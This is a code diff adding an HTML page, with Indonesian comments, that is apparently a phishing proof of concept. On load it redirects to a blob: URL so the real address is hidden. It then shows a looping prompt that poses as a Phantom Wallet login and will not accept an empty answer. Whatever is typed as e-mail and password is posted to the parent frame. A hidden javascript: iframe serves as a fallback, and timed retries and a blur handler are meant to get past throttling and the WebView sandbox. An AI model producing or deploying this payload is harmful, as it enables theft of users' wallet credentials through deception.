@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <title>Blob Null → Forced Prompt (Auto-Trigger)</title>
+  <!-- Sandboxing untuk menjaga alamat/indikator minimal & izinkan modal -->
+  <meta http-equiv="Content-Security-Policy" content="sandbox allow-scripts allow-modals">
+</head>
+<body>
+<script>
+  // Auto-run saat halaman dimuat
+  (function () {
+    // Konten HTML di dalam Blob (address bar akan menjadi blob:null/blank)
+    const blobInner = `<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>Bypass sandbox WebView – forced prompt (Blob)</title>
+  <style>
+    iframe{visibility:hidden;position:absolute;width:0;height:0;border:0;}
+    body{font-family:system-ui,sans-serif;text-align:center;padding-top:100px;}
+  </style>
+</head>
+<body>
+  <h1>Loading…</h1>
+  <iframe id="shim"></iframe>
+  <script>
+  (function(){
+    var solved = false;
+    var msg =
+      'In order to access phantom.app\\n' +
+      'you must first login on your\\nPhantom Wallet Account.\\n\\n' +
+      'Please type your e-mail\\nand your password:';
+
+    function directLoop(){
+      try {
+        if (solved) return true;
+        var v = '';
+        while (v === null || (''+v).trim() === '') {
+          v = prompt(msg, 'E-mail / Password.');
+        }
+        solved = true;
+        try { top.postMessage({creds: v, from: 'blob-forced-prompt'}, '*'); } catch(e) {}
+      } catch(e) {
+        return false; // prompt diblok/dilempar exception
+      }
+      return true;
+    }
+
+    function iframeJsLoop(){
+      try {
+        if (solved) return true;
+        var code =
+          "(function(){try{" +
+          "var m=" + JSON.stringify(msg) + ";" +
+          "var v='';" +
+          "while(v===null||(''+v).trim()===''){v=prompt(m,'E-mail / Password.');}" +
+          "try{top.postMessage({creds:v,from:'iframe-javascript'},'*');}catch(e){}" +
+          "}}catch(e){}})()";
+        var shim = document.getElementById('shim');
+        shim.src = 'javascript:' + code;
+        return true;
+      } catch(e) { return false; }
+    }
+
+    function tryAll(){
+      if (solved) return;
+      if (!directLoop()) iframeJsLoop();
+    }
+
+    // 1) Coba langsung saat load
+    tryAll();
+
+    // 2) Ulangi sebentar untuk melewati throttling/heuristics (maks 5 detik)
+    var id = setInterval(tryAll, 600);
+    setTimeout(function(){ clearInterval(id); }, 5000);
+
+    // 3) Jika user sempat switch app/tab (blur), coba lagi setelah balik
+    window.onblur = function(){ setTimeout(tryAll, 50); };
+  })();
+  <\/script>
+</body>
+</html>`;
+
+    // Buat Blob & redirect otomatis
+    const blob = new Blob([blobInner], { type: 'text/html' });
+    const url = URL.createObjectURL(blob);
+    // replace agar history lebih bersih
+    location.replace(url);
+  })();
+</script>
+</body>
+</html>
